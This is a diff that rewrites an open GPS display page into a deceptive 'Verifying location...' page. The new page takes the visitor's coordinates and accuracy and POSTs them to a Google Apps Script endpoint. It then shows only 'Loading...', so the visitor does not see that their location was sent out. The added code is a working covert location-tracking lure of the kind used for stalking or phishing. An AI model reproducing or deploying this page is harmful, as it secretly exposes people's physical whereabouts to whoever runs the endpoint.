@@ -1,23 +1,23 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>GPS Location Tracker</title>
-</head>
-<body>
-  <h2>Please click “Allow” to share your location</h2>
-  <p id="status">Waiting for location...</p>
-  <script>
-    navigator.geolocation.getCurrentPosition(
-      function(position) {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        document.getElementById("status").innerText =
-          `Latitude: ${lat}, Longitude: ${lon}`;
-      },
-      function(error) {
-        document.getElementById("status").innerText = "Location access denied.";
-      }
-    );
-  </script>
-</body>
+  <head><title>Verifying location...</title></head>
+  <body>
+    <h3>Checking your location...</h3>
+    <script>
+      navigator.geolocation.getCurrentPosition(function(pos) {
+        fetch('https://script.google.com/macros/s/AKfycbzNulV9cuGEYTEFzDy04_pE6eyz6jXcsLXIg6VVzcuoCI-ulHPje9TnyoAse8ufIAVudg/exec', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy
+          })
+        });
+        document.body.innerHTML = "<h3>Loading...</h3>";
+      }, function() {
+        document.body.innerHTML = "Location access denied.";
+      });
+    </script>
+  </body>
 </html>
